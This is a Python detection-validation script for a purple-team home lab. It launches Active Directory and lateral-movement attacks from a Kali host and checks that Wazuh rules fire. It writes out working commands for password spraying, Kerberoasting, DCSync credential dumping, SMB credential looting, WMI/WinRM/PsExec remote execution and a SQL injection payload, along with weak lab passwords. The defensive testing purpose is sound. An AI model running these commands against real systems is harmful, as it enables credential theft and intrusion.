#!/usr/bin/env python3
# ===========================================================================
# ad-validate.py — automated atk-01-launched attack -> detection validation.
#
# The atk-01 counterpart to purple-team.py. purple-team.py runs Atomic Red Team
# ENDPOINT tests locally on ws-01; this runs real attacks launched FROM atk-01
# (Kali) — originally just domain attacks against the Samba AD DC, extended
# 2026-09-06 to every technique whose telemetry can only be produced by an
# INBOUND attack from another host (WMI/WinRM/PsExec lateral movement into
# ws-01, a web attack against dmz-01) — no local ART atomic can fake that shape,
# since the detection keys on being the *target* of the connection, not the
# source. Same "attack -> prove the detection fired" discipline either way — a
# repeatable "is my detection still green?" harness (and practice range).
#
# For each scenario: count the expected rule(s) in the manager's alert log, launch
# the attack from atk-01, wait, count again — a positive delta = detection fired.
# Same source-of-truth (alert-log diff) as purple-team.py, robust against
# pre-existing alerts with no indexer/timestamp dependency.
#
#   PASS = the attack ran AND the intended detection fired.
#   FAIL = a coverage gap (or the attack didn't land) — a finding, not an error.
#   SKIP = the scenario's target host is unreachable (e.g. fs-01 powered off),
#          or it needs a credential (ADMIN_USER/ADMIN_PW) that isn't set — the
#          ws-01 local-admin Windows password is deliberately NOT committed
#          (unlike the AD service-account creds below, which are training-lab
#          values already public in known-weaknesses.md): SSH to ws-01 uses a
#          key, but nxc's SMB/WinRM auth is a separate credential entirely.
#
# Weak lab creds below are already public in phase-2-identity/known-weaknesses.md.
# Run from the operator host (SSH aliases atk-01 / siem-01 / fs-01 in ~/.ssh/config):
#   ADMIN_USER=localadmin ADMIN_PW=... ./ad-validate.py
# ===========================================================================
import os
import subprocess
import sys
import time

SIEM = "siem-01"
SETTLE = 25          # agent -> manager -> (correlation) latency
ATTACK_TIMEOUT = 180  # secretsdump/GetUserSPNs are slow when they fail against Samba

SPRAY_USERS = "Administrator\\nasmith\\njdoe\\nbwilson\\nsvc-web\\nsvc-sql\\nsvc-backup\\nsvc-legacy"

# ws-01 (CORP victim workstation) and dmz-01 (Juice Shop) — see docs/00-ip-plan.md.
WS_IP = "10.10.10.50"
DMZ_WEB = "http://10.10.20.10:3000"
ADMIN_USER = os.environ.get("ADMIN_USER", "")
ADMIN_PW = os.environ.get("ADMIN_PW", "")

# Each scenario runs `cmd` on `host` and expects a positive delta in `rules`.
SCENARIOS = [
    {
        "name": "Password Spray",
        "host": "atk-01",
        "cmd": (f"printf '{SPRAY_USERS}\\n' > /tmp/ad-spray-users.txt && "
                "nxc smb 10.10.10.10 -u /tmp/ad-spray-users.txt -p Summer2026 --continue-on-success"),
        "rules": ["100401"],
        "technique": "T1110.003",
        "desc": "one password x many accounts -> burst rule (T1110.003)",
    },
    {
        "name": "Kerberoasting",
        "host": "atk-01",
        "cmd": ("impacket-GetUserSPNs lab.internal/svc-sql:Summer2026 -dc-ip 10.10.10.10 -request"),
        "rules": ["100031"],
        "technique": "T1558.003",
        "desc": "request 3+ service tickets in 60s (T1558.003)",
    },
    {
        "name": "DCSync",
        "host": "atk-01",
        "cmd": ("impacket-secretsdump lab.internal/svc-backup:Backup2026@dc-01.lab.internal -just-dc-ntlm"),
        "rules": ["100080"],
        "technique": "T1003.006",
        "desc": "DsGetNCChanges from a non-DC (T1003.006)",
    },
    {
        # Requires fs-01 (weak [public] share). SKIPs cleanly when fs-01 is down.
        "name": "Credential Theft",
        "host": "atk-01",
        "requires": "fs-01",
        "cmd": ("smbclient //10.10.10.20/public -U 'lab.internal\\svc-sql%Summer2026' "
                "-c 'get map-backup-share.ps1 /tmp/loot.ps1'"),
        "rules": ["100090"],
        "desc": "read planted credential file on the weak share (T1552.001)",
    },
    # --- Added 2026-09-06: inbound attacks that can only be validated from the
    # attacker's side (WMI/WinRM/PsExec need to be the TARGET of a remote-exec
    # connection; a local ART atomic on ws-01 can't produce that telemetry shape).
    # All three need ADMIN_USER/ADMIN_PW (ws-01 local-admin Windows creds, not
    # committed) and SKIP cleanly without them.
    {
        "name": "WMI Lateral Movement",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": (f"nxc smb {WS_IP} -u '{ADMIN_USER}' -p '{ADMIN_PW}' "
                "--exec-method wmiexec -x whoami"),
        "rules": ["100515"],
        "technique": "T1047",
        "desc": "WmiPrvSE spawns a shell on ws-01 (T1047)",
    },
    {
        "name": "WinRM Lateral Movement",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": f"nxc winrm {WS_IP} -u '{ADMIN_USER}' -p '{ADMIN_PW}' -x whoami",
        "rules": ["100516"],
        "technique": "T1021.006",
        "desc": "wsmprovhost spawns a shell on ws-01 (T1021.006)",
    },
    {
        "name": "PsExec Lateral Movement",
        "host": "atk-01",
        "requires_env": ["ADMIN_USER", "ADMIN_PW"],
        "cmd": (f"nxc smb {WS_IP} -u '{ADMIN_USER}' -p '{ADMIN_PW}' "
                "--exec-method psexec -x whoami"),
        "rules": ["100513", "100514"],
        "technique": "T1569.002",
        "desc": "PSEXESVC runs/spawns a shell on ws-01 (T1569.002)",
    },
    {
        # No credential needed — the web app has no auth on the attacked endpoints.
        "name": "DMZ Web Attack",
        "host": "atk-01",
        "cmd": (f"curl -sk --max-time 10 -o /dev/null "
                f"\"{DMZ_WEB}/rest/products/search?q=test%27%20OR%201=1--\""),
        "rules": ["100440"],
        "technique": "T1190",
        "desc": "SQLi against Juice Shop -> Suricata 9100020 -> Wazuh 100440 (T1190)",
    },
    {
        # Self-contained (no external download) — the .NET Compress-Archive
        # cmdlet ships with PowerShell 5.1; the ART atomics for T1560.001 all
        # need rar/7zip/winzip installers pulled from the internet, which ws-01
        # by design can't reach (see phase-5-offense/atomic-red-team/README.md).
        "name": "Archive Collection",
        "host": "ws-01",
        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
                "New-Item -ItemType Directory -Force -Path $env:TEMP\\stage | Out-Null; "
                "'purple-team' | Out-File $env:TEMP\\stage\\note.txt; "
                "Compress-Archive -Path $env:TEMP\\stage\\* "
                '-DestinationPath $env:TEMP\\stage.zip -Force"'),
        "rules": ["100519"],
        "technique": "T1560.001",
        "desc": "Compress-Archive stages a fileless archive on ws-01 (T1560.001)",
    },
]


def ssh(host, cmd, timeout=90):
    try:
        return subprocess.run(["ssh", "-o", "ConnectTimeout=15", host, cmd],
                              capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args=[], returncode=124, stdout="", stderr="timeout")


def reachable(host):
    return ssh(host, "echo up", timeout=20).stdout.strip() == "up"


def count_rules(rule_ids):
    ids = "|".join(rule_ids)
    remote = (f"sudo grep -acE '\"id\":\"({ids})\"' /var/ossec/logs/alerts/alerts.json 2>/dev/null")
    r = ssh(SIEM, remote, timeout=30)
    for line in reversed(r.stdout.strip().splitlines()):
        if line.strip().isdigit():
            return int(line.strip())
    return 0


def main():
    print(f"\n== AD attack -> detection validation :: siem={SIEM} ==\n")
    results = []
    for s in SCENARIOS:
        req = s.get("requires")
        if req and not reachable(req):
            print(f"  [SKIP] {s['name']:17} needs {req} (unreachable)          {s['desc']}")
            results.append((s["name"], None))
            continue
        env_req = s.get("requires_env") or []
        missing = [v for v in env_req if not os.environ.get(v)]
        if missing:
            print(f"  [SKIP] {s['name']:17} needs {'/'.join(missing)} env var(s)   {s['desc']}")
            results.append((s["name"], None))
            continue
        before = count_rules(s["rules"])
        t0 = time.time()
        ssh(s["host"], s["cmd"], timeout=ATTACK_TIMEOUT)
        time.sleep(SETTLE)
        delta = count_rules(s["rules"]) - before
        latency = round(time.time() - t0, 1)
        ok = delta > 0
        results.append((s["name"], ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] {s['name']:17} "
              f"rules {','.join(s['rules']):8} hits={delta} {latency}s  {s['desc']}")
    ran = [r for r in results if r[1] is not None]
    passed = sum(1 for _, ok in ran if ok)
    skipped = sum(1 for _, ok in results if ok is None)
    print(f"\n== {passed}/{len(ran)} AD detections validated"
          f"{f' ({skipped} skipped)' if skipped else ''} ==\n")
    sys.exit(0 if ran and passed == len(ran) else 1)


if __name__ == "__main__":
    main()
